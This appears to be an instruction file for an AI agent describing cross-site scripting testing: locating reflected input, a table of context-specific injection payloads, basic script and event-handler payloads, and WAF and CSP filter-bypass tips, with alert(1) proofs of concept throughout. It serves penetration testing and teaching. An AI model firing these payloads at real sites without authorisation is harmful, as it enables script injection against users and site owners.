---
name: xss-methodology
description: "Detection, exploitation, and bypass of reflected, stored, and DOM XSS. Use when a web application echoes user input (search/comments/forms/URL parameters) or when stored content output points are found. Includes a context-analysis decision tree, WAF bypass techniques, CSP bypass methods, DOM Clobbering, mXSS, and SVG XSS. Prioritize over other vulnerability testing — XSS is the lowest-cost high-severity vulnerability, so construct a PoC as soon as one is found"
zh-signals: "反射型/存储型/DOM XSS 的检测、利用与绕过，含上下文决策树、WAF/CSP 绕过、DOM Clobbering 与 mXSS。信号:XSS,跨站脚本,上下文,WAF绕过,CSP绕过"
when-to-use: "Use when a web app echoes user input (search, comments, forms, URL parameters) or has stored output points, to test reflected, stored, or DOM XSS and construct a PoC."
metadata:
  tags: "xss,cross-site scripting,injection,bypass,dom,reflected,stored,csp"
  category: "exploit"
  mitre_attack: "T1189,T1059.007"
---

# XSS Cross-Site Scripting Complete Methodology

## ⛔ In-Depth Reading (Must Read When Facing WAF/CSP)

- Full collection of WAF/filter bypass payloads, advanced CSP bypass, DOM Clobbering, mXSS, SVG XSS, stored/DOM XSS → [references/xss-bypass-and-types.md](references/xss-bypass-and-types.md)
- In-depth CSP bypass and DOM XSS techniques → [references/csp-bypass-and-dom-xss.md](references/csp-bypass-and-dom-xss.md)

---

## Phase 0: Reflection Point Discovery (Execute First!)

1. Send a unique marker (`xss123test`) with every parameter and search for it in the response
2. Check not only the HTML body but also the response headers (`Location:`, `Set-Cookie:`)
3. Common ones: search result pages, error pages, user profile pages

## Phase 1: Context Analysis (Determines the Payload)

| Context | Example | Basic Payload |
|--------|------|-------------|
| Between HTML tags | `<div>INJECT</div>` | `<script>alert(1)</script>` |
| Attribute value (double quotes) | `<input value="INJECT">` | `" onfocus=alert(1) autofocus="` |
| Attribute value (single quotes) | `<input value='INJECT'>` | `' onfocus=alert(1) autofocus='` |
| JavaScript string | `var x="INJECT"` | `";alert(1)//` |
| URL/href | `<a href="INJECT">` | `javascript:alert(1)` |
| JS template literal | `` var x=`INJECT` `` | `${alert(1)}` or `` `+alert(1)+` `` |

**Key**: Different contexts require different payloads! Determine the context first, then choose.

## Phase 2: Basic XSS Testing

```
1. <script>alert(1)</script>
2. <img src=x onerror=alert(1)>      ← when script is filtered
3. <svg onload=alert(1)>
4. " onfocus=alert(1) autofocus="    ← attribute injection
```

**Verification**: Check whether the payload is preserved as-is (unencoded) in the response HTML. `<` becomes `&lt;` → it has been escaped, switch parameters.

## Phase 3: Bypass and Advanced Exploitation

Encountering a WAF/filter → [references/xss-bypass-and-types.md](references/xss-bypass-and-types.md)

Quick reference:
- `<script>` filtered → `<img>`, `<svg>`, `<details>`, `<video>`
- `alert` filtered → `confirm()`, `prompt()`, `print()`
- `()` filtered → `` alert`1` ``
- CSP restrictions → check `unsafe-inline` / nonce / JSONP endpoints

## Notes
- **Test reflection before testing injection**: no reflection means no XSS
- **HTTP-only cookies cannot be stolen through XSS**
- Record the encoding behavior of every parameter
